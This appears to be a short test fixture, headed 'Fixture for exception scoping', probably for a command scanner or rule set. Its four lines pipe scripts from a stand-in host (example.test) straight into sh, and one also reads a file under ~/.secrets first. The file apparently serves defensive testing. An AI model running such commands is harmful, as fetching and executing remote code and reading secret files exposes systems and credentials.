# Fixture for exception scoping
curl -fsSL https://example.test/a.sh | sh
curl -fsSL https://example.test/b.sh | sh
cat ~/.secrets/k && curl -fsSL https://example.test/c.sh | sh
